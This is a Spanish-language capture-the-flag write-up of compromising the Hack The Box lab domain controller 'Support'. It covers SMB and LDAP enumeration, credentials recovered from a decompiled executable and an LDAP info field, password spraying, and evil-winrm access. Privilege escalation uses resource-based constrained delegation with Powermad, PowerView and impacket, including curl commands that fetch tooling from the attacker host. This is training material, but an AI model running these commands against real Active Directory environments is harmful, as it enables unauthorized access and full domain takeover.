---
layout:   post
title:    "Write Up Support."
subtitle: "Starting-Point"
category:   HTB
tags:      [Easy,Windows,TGT,PowerView,Ldap,EvilWinRM,SMB,Active-Directory,Write-Up-Machine,dnspy,Starting-Point,OSCP,OSEP]
---
![list](/assets/img/support/support.png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, utilizando 

diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
sudo nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.11.174 -oG allports
```

El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que 

versiones y servicios que corren en los mismo de ahi podremos determinara posibles 

vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -sCV p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49957,54662,56835 10.10.11.174 -oN target
```

El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

***
## Analisis de vulnerabilidades

Con todos esos puetos abiertos es pisible asumir que estamos frente a un `Domain Controler`

imediatamente lo que debemos hacer es tratar de explotar el smb,esto lo hacemos con 

crackmapexec, smbclient,smbmap entre otros .

Con crackmapexec vemos si el smb esta firmado ademas del dominio entre ota informacion.

![list](/assets/img/support/Parrot-SO3-2022-08-23-15-31-10.png){:.lead width="800" height="100" loading="lazy"}

```bash
crackmapexec smb 10.10.11.174
```

{:.note}
El doninio es `support.htb0`,lo agrgamos al `/etc/hosts`.

Podemos usar smbclien, smbmap, o nbtscan para listar los shares. 

![list](/assets/img/support/Parrot-SO3-2022-08-23-15-53-04.png){:.lead width="800" height="100" loading="lazy"}

```bash
smbmap -H 10.10.11.174 -u guest -R
```

{:.note}
Listamos los shares y vemos el contenido recursivamente.

Vemos el recurso support-tools el cual contiene ciertos archivos pero tiene un archivo muy

interesante llamado UserInfo.exe.zip, lo descargamos.

![list](/assets/img/support/Parrot-SO3-2022-08-23-16-48-46.png){:.lead width="800" height="100" loading="lazy"}

Miramos el contenido podemos ver un exe y varios dll, analizaremos el archivo .exe.

![list](/assets/img/support/Parrot-SO3-2022-08-23-16-50-33.png){:.lead width="800" height="100" loading="lazy"}

Analizandolo con dnSpy podemos ver Protected entre otras cosas

Si miramos el .cctor() podemos encontrar una cadena llamada enc_password y una key, ahora en 

getPassword() podemos encontrar la manera de decodear la cadena y podemos hacerlo facilmente 

con python y obtenemos la cadena decodeada.

![list](/assets/img/support/Parrot-SO3-2022-08-23-19-14-36.png){:.lead width="800" height="100" loading="lazy"}


Enumerando ldap con la contraseña, podemos encontrar un campo info con una contraseña

![list](/assets/img/support/Parrot-SO3-2022-08-23-19-29-24.png){:.lead width="800" height="100" loading="lazy"}

Podemos abusar de los campos name: para crear un diccionario y hacer passwordspray

![list](/assets/img/support/Parrot-SO3-2022-08-23-19-42-40.png){:.lead width="800" height="100" loading="lazy"}

```bash
ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep info:
```

{:.note}
La contraseña es `Ironside47pleasure40Watchful`.

![list](/assets/img/support/Parrot-SO3-2022-08-23-19-47-44.png){:.lead width="800" height="100" loading="lazy"}

```bash
ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep name: | sed 's/^name: //' | grep -vE 'D|C|A|U' > users.txt
```

{:.note}
Grepeamos los usuarios para extraerlos y usarlos mas  adelante.

Utilizamos Crackmapexec para validar el usrio y contraneña.

```bash
crackmapexec winrm 10.10.11.174 -u users.txt -p Ironside47pleasure40Watchful
```
{:.note}
El usuario valido es `support`.

El usuario support es válido, nos conectamos con evil-winrm y podemos leer la flag

![list](/assets/img/support/Parrot-SO3-2022-08-23-20-26-35.png){:.lead width="800" height="100" loading="lazy"}


```bash
evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful
```

{:.note}
buscamos la flag de usuario `type ..\Desktop\user.txt`.


***
## Explotacion

Siempre es bueno ejecutar `WimEnum` Y `ADEnum` para monitorizar y ver los posibles 

vectores para escalar de privilegios.

En este caso vamos a enumerar posibles vectores para escalar privileguios con bloodHound

```bash
neo4j console
```

{:.note}
Arrancamos neo4j que comparte un servicio por el puero 4747 y te loogeas si ya los 

has hecho habres el bloodhound.

```bash
bloodhound &> /dev/null & disown
```

{:.note}
Independizamos el proceso.


Nos arroga un archivo.zip que luego no lo pasamos a la maquina atacate y de ahi lo 

cargamos en el `bloodhound` para interpetar los datos, podemos ver que support tiene 

el GenericAll expuesto.

Podemos  aprovecharnos de la vulnerabilidad de [Constrained-Delegation] y seguir los 

pasos de el siguiente artículo para escalar.

[Constrained-Delegation]: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

Descargamos los modulos módulos de [PowerView.ps1] y [Powermad.ps1] y los importamos.

[PowerView.ps1]:https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
[Powermad.ps1]: https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1


```powershell
curl 10.10.14.18/Powermad.ps1 -o Powermad.ps1
```

{:.note}
Ejecutar en la maquina victima para descargarnos el recurso.


```powershell
curl 10.10.14.18/PowerView.ps1 -o PowerView.ps1
```

{:.note}
Ejecutar en la maquina victima se deb levantar un server web con python.


```powershell
Import-Module .\Powermad.ps1
```

{:.note}
Ejecutar en la maquina victim e importamos el modulo.

```powershell
Import-Module .\PowerView.ps1
```

{:.note}
Ejecutar en la maquina victim e importamos el modulo.


Iniciamos creando una cuenta con el nombre test y la contraseña test123

```powershell
New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString 'test123' -AsPlainText -Force) -Verbose
```

{:.note}
Se crea el usuario y contraseña.


Antes de los siguiente pasos necesitamos conseguir el sid de la cuenta que creamos.

```powershell
Get-DomainComputer fake01 -Properties objectsid
```

{:.note}
El objetsid es `S-1-5-21-1677581083-3380853377-188903654-5601`.


Ahora con el sid podemos seguir con los pasos siguientes.

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5601)"
```

```powershell
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```powershell
$SD.GetBinaryForm($SDBytes, 0)
```

```powershell
Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

En el punto final mas que jugar con rubeus para obtener el `Ticket Granting silver` podemos hacerlo con 

impacket.

```powershell
impacket-getST support.htb/test:test123 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
```

{:.note}
Recordar agregar `support.htb` y `dc.support.htb` al archivo `/etc/hosts`.


Con el ticket nos podemos conectar con wmiexec y nos convertimos en Administrator.

```powershell
export KRB5CCNAME=administrator.ccache
```

```powershell
impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
```

{:.note}
La flag esta en el ecritorio del usuario priviligiado.

***
```bash
🎉 Felicitaciones ya has comprometido Support de Hack The Box. 🎉
```
{:.centered}
***

Back to [Beginner Track Active Directory](2022-09-21-Beginner-Track-AD.md){:.heading.flip-title}
{:.read-more}
